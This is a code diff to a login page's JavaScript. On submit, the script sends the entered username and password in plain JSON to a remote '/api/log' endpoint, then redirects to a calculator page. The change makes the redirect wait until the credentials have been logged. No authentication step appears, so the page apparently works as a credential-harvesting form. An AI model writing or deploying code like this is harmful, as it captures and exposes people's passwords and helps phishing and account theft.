@@ -63,25 +63,27 @@
   </div>
 
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
-  // Get the entered values
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
 
-  // Send credentials to Vercel logs
-  fetch("https://gca-calc.vercel.app/api/log", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username, password })
-  })
-  .then(res => res.json())
-  .then(data => console.log("Server response:", data))
-  .catch(err => console.error(err));
+  try {
+    const res = await fetch("https://gca-calc.vercel.app/api/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password })
+    });
+    const data = await res.json();
+    console.log("Server response:", data);
 
-  // Redirect to the calculator page
-  window.location.href = 'calculator.html';
+    // Only redirect after successful logging
+    window.location.href = 'calculator.html';
+  } catch (err) {
+    console.error(err);
+    alert("There was a problem logging in. Try again.");
+  }
 });
 </script>
 
